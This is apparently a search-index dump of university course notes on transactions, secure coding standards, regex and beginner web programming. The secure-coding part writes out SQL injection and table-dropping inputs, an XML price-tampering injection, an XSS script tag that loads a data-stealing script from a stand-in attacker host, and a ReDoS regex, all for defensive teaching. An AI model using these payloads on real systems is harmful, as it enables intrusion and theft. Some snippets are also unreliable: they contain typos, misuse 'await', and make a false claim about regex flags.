</p> <ol> <li> <p>we instantiate a specific connection object from the <code>db.pool</code> object. We replace all the use of <code>db.pool.query()</code> by <code>connection.query()</code>. </p> <p>If we use <code>db.pool.query()</code> directly, each time a new connection is instantiated and there is no way to ensure the set of queries are enclosed in the same transaction block. </p> </li> <li> <p>We then declare the transaction isolation level. <code>SERIALIZABLE</code> means any READ-WRITE operation pairs applied on the same table from different transactions are considered in-conflict. For details please refer to <code>https://dev.mysql.com/doc/refman/8.0/en/innodb-transaction-isolation-levels.html#isolevel_read-uncommitted</code></p> </li> <li>We enclose the critical section with the <code>START TRANSACTION</code> and <code>COMMIT</code>. In case of a conflict is deteced, we rollback the transaction. </li> </ol> <p>With the above changes, our concurrent test should be always passed . </p>"},{"location":"notes/l12_1_concurrent_testing/#further-reading-on-transactions","title":"Further reading on transactions","text":"<ul> <li>https://mongoosejs.com/docs/transactions.html</li> <li>https://sequelize.org/docs/v6/other-topics/transactions/</li> </ul>"},{"location":"notes/l12_2_code_std/","title":"50.003 - Code Standards","text":""},{"location":"notes/l12_2_code_std/#learning-outcomes","title":"Learning Outcomes","text":"<p>By the end  of this unit, you should be able to </p> <ol> <li>Apply SEI CERT Java Coding Standard to improve security level of a software system</li> </ol>"},{"location":"notes/l12_2_code_std/#coding-standard","title":"Coding Standard","text":"<p>Coding standard is a common guideline for a group of software engineers to follows so as to </p> <ol> <li>have a uniform structure of most of the codes</li> <li>improve readability </li> <li>improve referenceability </li> <li>improve maintainability</li> <li>minimize exploitability</li> </ol> <p>Example, we find </p> <ul> <li>https://google.github.io/styleguide/</li> <li>https://wiki.sei.cmu.edu/confluence/display/java/SEI+CERT+Oracle+Coding+Standard+for+Java</li> </ul>"},{"location":"notes/l12_2_code_std/#sei-cert-java-coding-standard","title":"SEI CERT Java Coding Standard","text":"<p>Let's take SEI CERT Java Coding Standard as an example. It consists of a set of rules which are meant to provide normative requirements for code. Each rule is associated with a metrics for severity (low, medium, and high), likelihood (unlikely, probably, and likely) and remediation cost (high, medium, and low). Conformance to the rule can be determined through automated analysis (either static or dynamic), formal methods, or manual inspection techniques.</p> <p>For example, we find a subset of the rules as follows,</p> <ul> <li>Input valuation and data sanitization</li> <li>Object-orientation (not related for now since we focus on JavaScript). But you are strongly encouraged to read up.</li> <li>Locking and thread-safety (we've covered in some earlier unit in week 6.)</li> <li>Visibility and atomicity (not covered in this course)</li> </ul> <p>Although these coding standards are set for Java and our main language for the module is JavaScript, we will discuss those are applicable to both languages.</p>"},{"location":"notes/l12_2_code_std/#input-validation-and-data-sanitization","title":"Input Validation and Data Sanitization","text":"<p>Many programs accept untrusted data originating from unvalidated users, network connections, and other untrusted sources and then pass the (modified or unmodified) data across a trust boundary to a different trusted domain. Such data must be sanitized. </p> <p>For example, we find the following rules in this category</p> <ol> <li>IDS00-J. Sanitize untrusted data passed across a trust boundary</li> <li>IDS01-J. Normalize strings before validating them</li> <li>IDS11-J. Eliminate non-character code points before validation</li> </ol>"},{"location":"notes/l12_2_code_std/#ids00-j-sanitize-untrusted-data-passed-across-a-trust-boundary","title":"IDS00-J. Sanitize untrusted data passed across a trust boundary","text":"<p>The main idea is simple, given data provided by 3<sup>rd</sup> party, we should perform some sanitization to ensure the data is not malicious. </p>"},{"location":"notes/l12_2_code_std/#sql-injection","title":"SQL Injection","text":"<p>An example of such data is SQL injection.</p> <p>Suppose, we have the following code</p> <pre><code>function login(db, un, pw) {\n    const [rows, fieldDefs] = await db.pool.query(`\n            SELECT * FROM db_user WHERE username='${un}' AND password='${pw}' \n        `);\n    let found = false;\n    if (rows.length &gt; 0) {\n        found = true;\n    }\n    return found;\n}\n</code></pre> <p>Function <code>login</code> takes a database connection object <code>con</code>, the username <code>un</code> and password <code>pw</code> and try to search for the user record in the <code>db_user</code> table.  Note that <code>un</code> and <code>pw</code> are input strings povided by external parties, normal users and malicious users.  A malicious user might set <code>un</code> to <code>\"\"</code> and <code>pw</code> to <code>\"' OR '0'='0\"</code> the query becomes </p> <p><pre><code>SELECT * FROM db_user WHERE username='' AND password='' OR '0' = '0';\n</code></pre> which always return all the records from the <code>db_user</code> table. As a result, the user can login without giving a user name and password.</p> <p>In the worst situation, a malicious user could give the following input <code>un = \"\"</code> and <code>pw = \"'; drop table db_user; --\"</code>, the query becomes</p> <pre><code>SELECT * FROM db_user WHERE username='' AND password=''; drop table db_user; --'\n</code></pre> <p>As a result, all the records in the <code>db_user</code> are deleted. </p> <p>To prevent SQL injection attacks, a Prepared Statement should be used.</p> <pre><code>function login(db, un, pw) {\n    const [rows, fieldDefs] = await db.pool.query(`\n            SELECT * FROM db_user WHERE username= ? AND password= ? \n        `, [un, pw]);\n    let found = false;\n    if (rows.length &gt; 0) {\n        found = true;\n    }\n    return found;\n}\n</code></pre> <p>In the updated version above, we use an overloaded <code>query()</code> to define a prepared statement. to manage the query. The <code>?</code> placeholders allow the programmers to indicate where the untrusted input should be inserted after being sanitized. Via the prepared statement, we sanitize the untrusted input strings before inserting them into the statement.</p>"},{"location":"notes/l12_2_code_std/#xml-injection","title":"XML Injection","text":"<p>Besides SQL injection, untrusted XML data fragment imposes threats  to the system security too. </p> <p>Consider the following JavaScript program </p> <p><pre><code>function addIPhone(qty) {\n    const doc = `&lt;item&gt;\n        &lt;description&gt;iPhone X&lt;/description&gt;\n        &lt;price&gt;999.0&lt;/price&gt; \n        &lt;quantity&gt;${qty}&lt;/quantity&gt; \n        &lt;/item&gt;`;\n    addToCart(doc);\n}\n</code></pre> when a normal user invokes the above function with <code>qty = \"1\"</code>, the resulting XML document </p> <pre><code>&lt;item&gt;\n    &lt;description&gt;iPhone X&lt;/description&gt;\n    &lt;price&gt;999.0&lt;/price&gt;\n    &lt;quantity&gt;1&lt;/quantity&gt;\n&lt;/item&gt;\n</code></pre> <p>which captures the user's shopping item, will be process by <code>addToCart()</code> function.</p> <p>Suppose a malicious user invokes the function with a rigged input <code>qty = \"1&lt;/quantity&gt;&lt;price&gt;1.0&lt;/price&gt;&lt;quantity&gt;1\"</code> which results in the following XML document </p> <p><pre><code>&lt;item&gt;\n    &lt;description&gt;iPhone X&lt;/description&gt;\n    &lt;price&gt;999.0&lt;/price&gt;\n    &lt;quantity&gt;1&lt;/quantity&gt;\n    &lt;price&gt;1&lt;/price&gt;\n    &lt;quantity&gt;1&lt;/quantity&gt;\n&lt;/item&gt;\n</code></pre> If the <code>addToCart()</code> method processes the elements top-to-bottom in order, it might override the price value <code>999.0</code> by <code>1</code>.</p> <p>The fix to this issue is similar to the one for SQL injection. What is required is to santize the input string before embedding into the XML template which is used as a trusted data. </p>"},{"location":"notes/l12_2_code_std/#ids01-j-normalize-strings-before-validating-them","title":"IDS01-J. Normalize strings before validating them","text":""},{"location":"notes/l12_2_code_std/#cross-site-scripting","title":"Cross Site Scripting","text":"<p>The third example of security loop holes caused by using untrusted data in the trusted context is Cross Site Scripting.</p> <p>Consider the following app</p> <pre><code>app.use('/', (req,res) =&gt; {\n    let msg = dbmodel.getOne();\n    res.send(\n        `&lt;div&gt; the message is &lt;/div&gt; &lt;div&gt; ${msg} &lt;/div&gt;`\n    );\n})\n</code></pre> <p>Suppose the message created by some normal user and recored in the database is <code>\"hello\"</code>. The above route handler returns</p> <pre><code>&lt;div&gt; the message is &lt;/div&gt;\n&lt;div&gt; hello &lt;/div&gt;\n</code></pre> <p>However the threat surfaces when the message retrieved from the database is  <code>\"&lt;script src='http://hacker-network.io/stealuserinfo.js' type='javascript'&gt;&lt;/script&gt; \"</code> as the resulting html document becomes</p> <pre><code>&lt;div&gt; the message is &lt;/div&gt;\n&lt;div&gt; &lt;script src='http://hacker-network.io/stealuserinfo.js' type='javascript'&gt;&lt;/script&gt; &lt;/div&gt;\n</code></pre> <p>when it is executed on the victim's browser, the hacker's script will be executed and extract the information from the victim's machine. </p> <p>One way to address this issue is to santize the record retrieved from the database</p> <pre><code>app.use('/', (req,res) =&gt; {\n    let msg = dbmodel.getOne();\n    const regex = /&lt;.*&gt;/g;\n    let html = \"\":\n    if (msg.match(regex)) {\n        html = \"&lt;div&gt; the message contains some illegal characters &lt;/div&gt;\";\n    } else {\n        html = `&lt;div&gt; the message is &lt;/div&gt; &lt;div&gt; ${msg} &lt;/div&gt;`;\n    }\n    res.send(html);\n})\n</code></pre> <p>However this might not cover all edge cases. Suppose the malicious user use the unicode representation of the <code>&lt;</code> and <code>&gt;</code>, namely and <code>\\uFE64</code> and <code>\\uFE65</code>.</p> <p>This motivates the need of normalizing the unicode representations into the ascii representation before sanization.</p> <pre><code>app.use('/', (req,res) =&gt; {\n    let msg = dbmodel.getOne();\n    const regex = /&lt;.*&gt;/g;\n    let html = \"\":\n    if (msg.normalize('NFKC').match(regex)) {\n        html = \"&lt;div&gt; the message contains some illegal characters &lt;/div&gt;\";\n    } else {\n        html = `&lt;div&gt; the message is &lt;/div&gt; &lt;div&gt; ${msg} &lt;/div&gt;`;\n    }\n    res.send(html);\n})\n</code></pre>"},{"location":"notes/l12_2_code_std/#using-regex-to-sanitze-input","title":"Using Regex to sanitze input","text":"<p>Regular expression (Regex) is a commonly use domain specific language for string and data matching. It has a compact syntax and light-weightish implementation. Most of the languages come with libraries support of regex. For instance, in JavaScript, we use the following statement to define a regex object. </p> <p><pre><code>const re = /ab+c/\n</code></pre> or <pre><code>const re = new RegExp(\"ab+c\")\n</code></pre></p> <p>Then we can run it using </p> <pre><code>console.log(abbbbc.match(re));\n</code></pre> <p>Here are some basic examples of constructing regex pattern. </p>"},{"location":"notes/l12_2_code_std/#matching-a-single-expression","title":"Matching a single expression","text":"<pre><code>const r1 = /a/;  // match one\n\"aaa\".match(r1); // [ 'a', index: 0, input: 'aaa', groups: undefined ]\n</code></pre> <p>In the above code snippet, <code>r1</code> is a regex that matches a character <code>a</code>.  In the second line, we match the input string <code>aaa</code> with the pattern. The result contains  the part that the regex matches, which is <code>'a'</code>, its index and the input and the groups if available.  Note that it only searches for the pattern once in the input string. </p>"},{"location":"notes/l12_2_code_std/#matching-a-single-expression-globally","title":"Matching a single expression globally","text":"<p>If we want to apply the regex to look matches \"globally\" over the input, we define</p> <pre><code>const r2 = /a/g; // match everywhere\n\"aaa\".match(r2); // [ 'a', 'a', 'a' ]\n</code></pre>"},{"location":"notes/l12_2_code_std/#case-insensitivity","title":"Case insensitivity","text":"<p>If we would like to ignore case sensitivity during the match, we add <code>i</code> to the flags field.</p> <pre><code>const r3 = /a/ig; // match everywhere case insensitively \n\"aAa\".match(r3); // [ 'a', 'A', 'a' ]\n</code></pre>"},{"location":"notes/l12_2_code_std/#anchored-match","title":"Anchored match","text":"<p>Sometimes we would like to regex to match with the exact starting and ending of the input. </p> <pre><code>const r4 = /^a$/; // match exact from the start to the end;\n\"aaa\".match(r4);  // null\n</code></pre> <p>In the above <code>^</code> denotes the starting of the input and <code>$</code> denotes the ending. </p>"},{"location":"notes/l12_2_code_std/#character-class-match","title":"Character class match","text":"<p>If we want to match a set of alterantive characters, we use </p> <pre><code>const r5 = /[ab]/g; // match everywhere with character group, a or b \n\"abb\".match(r5);  // [ 'a', 'b', 'b' ]\n</code></pre> <p>Note that if we use a <code>^</code> in a <code>[]</code> it means not, e.g. <code>/[^ab]/</code> means match any character except for <code>a</code> and <code>b</code>. </p>"},{"location":"notes/l12_2_code_std/#kleenes-star","title":"Kleene's star","text":"<p>Klenee's star allows us to repeat a sub-regex pattern many times. (Note this is different from the global flag <code>g</code>, which produces a list of matches). <pre><code>const r6 = /a*/ // repetition, zero or more\n\"aaa\".match(r6);  // [ 'aaa', index: 0, input: 'aaa', groups: undefined ]\n</code></pre></p>"},{"location":"notes/l12_2_code_std/#reference-group","title":"Reference group","text":"<p>Sometimes, we would like to match and extract parts of the input. We use paranthesis to annotate the sub part that we would like to extract.</p> <pre><code>const r7 = /a(a*)/ // match and extract into groups \n\"aaa\".match(r7);  // [ 'aaa', 'aa', index: 0, input: 'aaa', groups: undefined ]\n</code></pre> <p>In the above, we match then extract the rest of <code>a</code> after the first <code>a</code>. </p> <p>Note that we can add referenced kleene's star regex with a global flag. The following will produce an initialization error.</p> <pre><code>const r8 = /(a*)/g // error, won't allow\n</code></pre>"},{"location":"notes/l12_2_code_std/#more-on-repetition","title":"More on repetition","text":"<p>Besides kleene's star, we have the following different operators that define different constraint of repetition.</p> <pre><code>const r9 = /a+/ // repetition, one or more\nconst r10 = /a{2,}/ // repetition, two or more\nconst r11 = /a{2,3}/ // repetition, two or three\nconst r12 = /a{3}/ // repetition, exactly three\n</code></pre>"},{"location":"notes/l12_2_code_std/#pitfall-of-using-regex-as-input-sanitzer","title":"Pitfall of using Regex as input sanitzer","text":"<p>There many different algorithm in implementing regex matching. Unfortunately many existing libraries use a back-tracking approach when performing the regex matching. This leads to a possible security threat to the software system. e.g. </p> <pre><code>const evil = /^(a*)*h$/\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\".match(p);\n</code></pre> <p>The above takes a substantial amount of time to converge, because the nested kleene's star of <code>(a*)*</code>. The backtracking algorithm tries to back-track and searches for alternative to satisfy the match with the ending <code>h</code> character though there are exponentially many paths to back-track. </p> <p>In general, when a nested repeatable regex accept an empty input, it is problematic, it is classified as evil regular expression. </p> <p>For more details, refer to </p> <pre><code>https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n</code></pre>"},{"location":"notes/l1_1_web_prog_common_js/","title":"50.003 - Basics of Web Programming","text":""},{"location":"notes/l1_1_web_prog_common_js/#learning-outcomes","title":"Learning Outcomes","text":"<p>By the end of this unit, you should be able to</p> <ol> <li>Define an HTML document with elements and attributes.</li> <li>Define the cosmetic and layouts of an HTML documents using CSS.</li> <li>Use JavaScript to capture user inputs from HTML documents.</li> <li>Use JavaScript to render output to the HTML documents.</li> <li>Apply JavaScript operators to compute results</li> <li>Define customized JavaScript datatype using class</li> <li>Define named and anonymous functions in JavaScript</li> </ol>"},{"location":"notes/l1_1_web_prog_common_js/#basic-components-of-a-web-application","title":"Basic Components of A Web Application","text":"<p>A Web application consists of two major parts.</p> <ol> <li>Front-end - the user interface, is often presented with a browser on the PC or on the mobile devices. The front-end loads and presents the required data to the users. The front-end also captures the user's inputs and translates them into system actions to be performed by the web application (both frontend or backend).</li> <li>Back-end - the application's brain. It is often made up of the business logic layer and the data layer. The data layer takes care of the data storage, query and manipulation, while the business logic layer implements the defined actions to be performed given the user inputs (from the front-end).</li> </ol>"},{"location":"notes/l1_1_web_prog_common_js/#common-front-end-software-components","title":"Common front-end software components","text":"<ol> <li>HTML</li> <li>CSS</li> <li>JavaScript</li> </ol>"},{"location":"notes/l1_1_web_prog_common_js/#common-back-end-software-components","title":"Common back-end software components","text":"<ol> <li>A database or a set of databases</li> <li>A backend application server or a set of back-end application servers</li> <li>A set of cache storage (optional)</li> <li>A group of load balancers (optional)</li> </ol>"},{"location":"notes/l1_1_web_prog_common_js/#html","title":"HTML","text":"<p>Hyper Text Markup Language is a language to define the structure of a document (AKA a web page).</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;meta charset=\"utf-8\" /&gt;\n    &lt;title&gt;50.003&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;p class=\"heading\"&gt;Welcome to 50.003!&lt;/p&gt;\n    &lt;p id=\"msg1\" class=\"message\"&gt;It's about Software Engineering!&lt;/p&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>There are many versions/standards of HTML. We only consider HTML5 in this unit. An HTML document consists of a doctype declaration, which tells the browser which version of HTML it is in. The second part is an <code>&lt;html&gt;</code> element.</p> <p>Each element consists of an open tag and a close tag and the children. For instance, <code>&lt;html&gt;</code> is the opening tag and <code>&lt;/html&gt;</code> is the closing. The children of an elemnent can be elements or texts. However there are a set of rules governing what contents could appear in a given element. In the above example, the content of the <code>&lt;html&gt;</code> element consists of a <code>&lt;head&gt;</code> element and a <code>&lt;body&gt;</code> element. Element without child/content can be written in a short form, e.g. <code>&lt;meta charset=\"utf-8\" /&gt;</code> is a short hand of <code>&lt;meta charset=\"utf-8\"&gt;&lt;/meta&gt;</code>. Note that <code>charset=\"utf-8\"</code> denotes an attribute of this <code>&lt;meta&gt;</code> element.</p> <p>The HTML document in the above example defines a structure as follows,</p> <ul> <li>html</li> <li>head<ul> <li>meta</li> <li>title</li> <li>text</li> </ul> </li> <li>body<ul> <li>paragraph</li> <li>text</li> </ul> </li> </ul>"},{"location":"notes/l1_1_web_prog_common_js/#css","title":"CSS","text":"<p>Cascading Style Sheets is a language used in describing the presentation of a document. Being different from HTML, it focuses on the aesthetical requirement of the documents. For instance, it defines the answers to the following questions,</p> <ol> <li>Which font family should the title text be rendered in?</li> <li>How many pixels should the text margin be?</li> <li>... and etc.</li> </ol> <pre><code>p {\n  margin: 10px;\n}\n\n#msg1 {\n  font-family: \"Courier New\", Courier, monospace;\n}\n\n.heading {\n  font-size: larger;\n}\n</code></pre> <p>There are three rules in the above CSS. Each rule consists of two parts.</p> <ol> <li>terms preceding the <code>{</code> are called the selectors.</li> <li>terms being enclosed by <code>{</code> and <code>}</code> are called the declarations.</li> <li>Each declaration consists of a property (preceding the colon <code>:</code>) and a value (following the colon <code>:</code>).</li> <li>Declarations are terminated by a semi colon <code>;</code>.</li> </ol> <p>For instance, in the first rule, we find <code>p</code> as the selector, which means that this rule is applicable to all <code>&lt;p&gt;</code> elements in the target HTML document. For all applicable elements, we want to set the margin to be 10 pixel wide. The second rule applies to a particular element with id = <code>#msg1</code>. Note that ids in an HTML document must be unique. In this rule, we want to set the font family of the text contained in the applicable elements to <code>Courier New</code>. In the third rule, we would like to apply the declaration to all elements with <code>class</code> attribute equal to <code>heading</code>.</p> <p>Suppose the above css definitions are stored in a file named <code>hello.css</code>, we could add the following as one of the child element of the <code>&lt;head&gt;</code> element in the earlier html document.</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;meta charset=\"utf-8\" /&gt;\n    &lt;title&gt;50.003&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"hello.css\" /&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;p class=\"heading\"&gt;Welcome to 50.003!&lt;/p&gt;\n    &lt;p id=\"msg1\" class=\"message\"&gt;It's about Software Engineering!&lt;/p&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Note that selectors are composable, e.g. selector <code>p.heading</code> selects all <code>&lt;p&gt;</code> elements with <code>class</code> equal to <code>heading</code>.</p> <p>For information refers to</p> <pre><code>https://www.w3schools.com/cssref/css_selectors.php\n</code></pre>"},{"location":"notes/l1_1_web_prog_common_js/#overlapping-css-rules","title":"Overlapping CSS rules","text":"<p>Suppose we add a new CSS rule to the earlier CSS</p> <pre><code>p {\n  margin: 10px;\n}\n\n#msg1 {\n  font-family: \"Courier New\", Courier, monospace;\n}\n\n.heading {\n  font-size: larger;\n}\n// new rule\np.message {\n  margin: 5px;\n}\n</code></pre> <p>The first and the newly added rules are overlapping, i.e. the set of HTML elements they select are overlapping, i.e.</p> <pre><code>&lt;p id=\"msg1\" class=\"message\"&gt;It's about Software Engineering!&lt;/p&gt;\n</code></pre> <p>is selected by both rules. However the declarations of the two rules are not compatible. In such a situation, CSS interpretors will pick the one with higher specificity to apply the selected HTML element.</p> <p>For details on how specificity score is calculated, refer to the following</p> <pre><code>https://www.w3.org/TR/CSS21/cascade.html#specificity\n</code></pre>"},{"location":"notes/l1_1_web_prog_common_js/#javascript","title":"JavaScript","text":"<p>JavaScript is a programming language that was initially designed to run in the browsers. Its internal design was influenced by Lisp and Scheme, it s external syntax was strongly influence by Java, though its behavior differs from Java. In the last decade, JavaScript was extended to run directly in the backend systems as well. In this unit, we consider the version of JavaScript that run in the browsers.</p>"},{"location":"notes/l1_1_web_prog_common_js/#a-simple-example","title":"A Simple Example","text":"<p>First we modify the HTML document introduced earlier to include a <code>&lt;script&gt;</code> element. Note that we can't use <code>&lt;script/&gt;</code> short-hand as it won't work in certain browsers.</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;meta charset=\"utf-8\" /&gt;\n    &lt;title&gt;50.003&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"hello.css\" /&gt;\n    &lt;script src=\"hello.js\"&gt;&lt;/script&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;p class=\"heading\"&gt;Welcome to 50.003!&lt;/p&gt;\n    &lt;p id=\"msg1\" class=\"message\"&gt;It's about Software Engineering!&lt;/p&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>The content of the <code>hello.js</code> file is as follows.</p> <pre><code>console.log(\"hello\");\n</code></pre> <p>In the above, we define a JavaScript program that prints a string <code>hello</code> in the console. Note that the printed string will not appear in the HTML page, instead it is printed in the console of the browser</p> <ul> <li>Chrome and Edge: \"three vertical dot\" -&gt; \"More Tools\" -&gt; \"Developer Tools\" -&gt; \"Console\"</li> <li>Firefox: \"three horizontal bars\" -&gt; \"More Tools\" -&gt; \"Web Developer Tools\" -&gt; \"Console\"</li> <li>Alternatively, we may also use online learning tools such as</li> </ul> <pre><code>https://jsfiddle.net/\n</code></pre> <p>To display \"hello\" message in a pop-up window, we could change the <code>console.log()</code> method with <code>alert()</code>.</p> <pre><code>var msg = \"hello\";\n// console.log(msg);\nalert(msg);\n</code></pre> <p>In the above, we have 3 lines code JS codes. In the first statement we define a variable <code>msg</code> with value <code>\"hello\"</code>. In JavaScript <code>var</code> keyword in define a variable. The second statement the <code>console.log()</code> that we used previously and it is commented away. The third statement is a method call to <code>alert()</code> with <code>msg</code> as the actual argument.</p> <p>Lastly, if we want to add a string to the begining of the HTML document, we may use <code>document.write()</code> method.</p> <pre><code>var msg = \"hello\";\n/* console.log(msg);\nalert(msg); */\ndocument.write(msg);\n</code></pre> <p>In the above we use <code>/* ... */</code> to comment multiple lines. <code>document</code> is a predefined variable holding the reference of the current HTML document. <code>document.write()</code> takes a string and inserts it to the begining of the document.</p> <p>Note that the semi-colon at the end of each statment is optional.</p>"},{"location":"notes/l1_1_web_prog_common_js/#inputoutput","title":"Input/Output","text":"<p>One may ask, \"what about displaying the message inside some of the HTML element?\"</p>"},{"location":"notes/l1_1_web_prog_common_js/#first-attempt","title":"First attempt","text":"<p>Suppose we change the Javascript program as follows</p> <pre><code>var msg = \"hello\";\nvar p_elem = document.getElementById(\"msg1\");\np_elem.innerText = msg;\n</code></pre> <p>In the second statement, we call <code>document.getElementById()</code> to retrieve the reference to the element with id=<code>msg1</code> in the HTML document and store the reference in a variable <code>p_elem</code>. In the third statement, we set the inner HTML of this element as <code>msg</code>.</p> <p>Howe when we load the HTML with the above script, some error occured.</p> <pre><code>Uncaught TypeError: p_elem is null.\n</code></pre> <p>This is because we retrieve the element reference before the document is fully rendered hence <code>p_elem</code> is having a null reference.</p>"},{"location":"notes/l1_1_web_prog_common_js/#second-attempt","title":"Second attempt","text":"<p>To fix this problem, we need to postpone the JavaScript execution until =the doucment is fully rendered. There are two possible ways to do that.</p> <ol> <li>Write a busy loop to keep checking whether the document is fully rendered.</li> <li>Enclose the action (of updating the content of the <code>&lt;p id=\"msg1\"&gt;</code> element) in a function. Make this function into a call-back, which will only be invoked when the document is done with rendered.</li> </ol> <p>To keep the resource usage low, JavaScript adopts the 2<sup>nd</sup> idea.</p> <pre><code>var msg = \"hello\";\nfunction run() {\n  var p_elem = document.getElementById(\"msg1\");\n  p_elem.innerText = msg;\n}\ndocument.addEventListener(\"DOMContentLoaded\", run);\n</code></pre> <p>In the above, we define a function named <code>run</code> with no argument. The body of the function contains the action to be performed when the document is fully rendered. In the last statement, we register the <code>run()</code> function as the call-back of the event \"DOMContentLoaded\" of the <code>document</code> object. The function <code>run()</code> is able to access the variable <code>msg</code> defined outside. In JavaScript this is called closure.</p>"},{"location":"notes/l1_1_web_prog_common_js/#capturing-the-user-input","title":"Capturing the user input","text":"<p>Now let's add a textbox in the HTML document and capture the user's input in this textbox via a button click. Consider <code>textandbutton.html</code> as follows,</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;script src=\"textandbutton.js\"&gt;&lt;/script&gt;\n    &lt;meta charset=\"utf-8\" /&gt;\n    &lt;title&gt;50.003 sample code: Text and Button&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;div&gt;Your input: &lt;input id=\"textbox1\" type=\"text\" /&gt;&lt;/div&gt;\n    &lt;div&gt;Output: &lt;span id=\"span1\"&gt;&lt;/span&gt;&lt;/div&gt;\n    &lt;div&gt;&lt;button id=\"button1\"&gt;Submit&lt;/button&gt;&lt;/div&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>In the above HTML document, we find three components in the body, an <code>&lt;input&gt;</code>, a <code>&lt;span&gt;</code> as output field and a <code>&lt;button&gt;</code>.</p> <p>In the <code>textandbutton.js</code> we have the following definitions.</p> <pre><code>function handleButton1Click() {\n  var textbox1 = document.getElementById(\"textbox1\");\n  var span1 = document.getElementById(\"span1\");\n  span1.innerHTML = textbox1.value;\n}\n\nfunction run() {\n  var button1 = document.getElementById(\"button1\");\n  button1.addEventListener(\"click\", handleButton1Click);\n}\n\ndocument.addEventListener(\"DOMContentLoaded\", run);\n</code></pre>"},{"location":"notes/l1_1_web_prog_common_js/#javascript-variable","title":"JavaScript Variable","text":"<p>There are 2 ways to declare a variable: <code>var</code> and <code>let</code></p> <p>Use <code>const</code> to declare a constant</p> <p><code>let</code> and <code>const</code> was introduced in ES6 (ECMAScript 6) in 2015. ECMAScript is a language standard for JavaScript.</p> <p>The main difference between <code>var</code> and <code>let</code> mainly is the scope. <code>var</code> can be a global scope or function scope, while <code>let</code> is a block scope, meaning it only exists inside a code block. A code block is defined by curly brackets { }. Also, <code>var</code> variable can be redeclared, overriding the existing variable.</p> <p>When should you use <code>var</code> or <code>let</code>? Most of the time it does not matter. However, using <code>let</code> is preferred to prevent accidental variable overriding and it has a better memory management. Use <code>var</code> if the variable scope needs to be global or in the whole function. The code below demonstrate the difference:</p> <pre><code>var varA = \"varA\"; // Global Scope\nlet letA = \"letA\"; // Global Scope\n\nfunction globalAccess() {\n  console.log(varA); // Accessible anywhere\n  console.log(letA); // Accessible anywhere\n}\nglobalAccess();\n\nfunction outerFunc() {\n  if (1 &lt; 2) {\n    // Curly bracket defines a block\n    var varB = \"varB\"; // Function Scope\n    let letB = \"letB\"; // Block Scope\n  }\n  console.log(varB); // varB is accessible\n  console.log(letB); // Error, letB is NOT accessible\n}\nouterFunc();\n</code></pre>"},{"location":"notes/l1_1_web_prog_common_js/#function-and-anonymous-function","title":"Function and Anonymous Function","text":"<p>The syntax of function is as follows:</p> <pre><code>function functionName(parameters) {\n  // function body\n  return output;\n}\n\n// Invoke function\nfunctionName(args);\n</code></pre> <p>In JavaScript, you can declare anonymous functions using either of these syntaxes:</p> <pre><code>function (params) {\n  //function body\n  return output;\n}\n</code></pre> <p>or,</p> <pre><code>(params) =&gt; {\n  //function body\n  return output;\n};\n</code></pre> <p>Anonymous functions are commonly use for one-time use function. You will see and use a lot of this kind of function in JavaScript.</p>"},{"location":"notes/l1_1_web_prog_common_js/#basic-data-structures","title":"Basic Data Structures","text":""},{"location":"notes/l1_1_web_prog_common_js/#string","title":"String","text":"<p>String in Javascript is a builtin datatype.</p> <pre><code>var myStr = \"hello\";\n</code></pre> <p>We can access the characters in the string <code>myStr</code> by their positions.</p> <pre><code>myStr[0];\n</code></pre> <p>returns a string containing the first character of <code>myStr</code>.</p> <pre><code>myStr[myStr.length - 1];\n</code></pre> <p>returns a string containing the last character of <code>myStr</code>. <code>myStr.length</code> computes the length of <code>myStr</code>.</p> <pre><code>myStr + \" 123\";\n</code></pre> <p>returns a new string by concatenating <code>myStr</code> to another string <code>\" 123\"</code>. Note that <code>myStr</code> remains unchanged. Alternatively, we could use <code>myStr.concat(\" 123\")</code>, which produces the same result. If we would to store the result of concatention, we need to assign it to a new variable.</p> <pre><code>var newStr = myStr + \" 123\";\n</code></pre> <p>We can also use <code>${}</code> to embed a string variable into a template string. A template string is enclosed with (`) instead of (\").</p> <pre><code>var newStr = `${myStr} 123`;\n</code></pre> <p>We may split a string by <code>.split()</code> method.</p> <pre><code>var myStrs = newStr.split(\" \");\n// Array(2) [\"abc\", \"123\"]\n</code></pre> <p>In the above, we split <code>newStr</code> into an array of two substrings, with <code>\" \"</code> as the separator. We will discuss JavaScript arrays shortly.</p> <p>Note that we can call <code>.split(\"\")</code>, we split the string into substrings where each substring is a character from the original string.</p> <pre><code>var myChars = newStr.split(\"\");\n// Array(7) [ \"a\", \"b\", \"c\", \" \", \"1\", \"2\", \"3\" ]\n</code></pre> <p>When we call <code>.split()</code> without any argument the string is not splitted and the result array contains one element which is the whole string.</p> <pre><code>var notSplitted = newStr.split();\n// Array [ \"abc 123\" ]\n</code></pre> <p>There are three different methods for extracting a sub-string from a string in JavaScript</p> <pre><code>myStr.substring(1, 3);\n// \"bc\"\n</code></pre> <p>extracts the subtring starting from index <code>1</code> until <code>2</code>. The first argument is the starting index and the second one is the end index (end index itself is excluded in the output). The second method is <code>.substr</code> method:</p> <pre><code>myStr.substr(1, 2);\n// \"bc\"\n</code></pre> <p>extracts <code>2</code> characters starting from index\u00a0<code>1</code>. The first argument is the starting index and the second one is the length of the substring. The third method is using <code>.slice</code>:</p> <pre><code>myStr.slice(1, 3);\n// \"bc\"\n</code></pre> <p>behaves the same as <code>.substring()</code>. However, when <code>.slice()</code> is given a single argument, it behaves like the index access.</p> <pre><code>myStr.slice(2) == 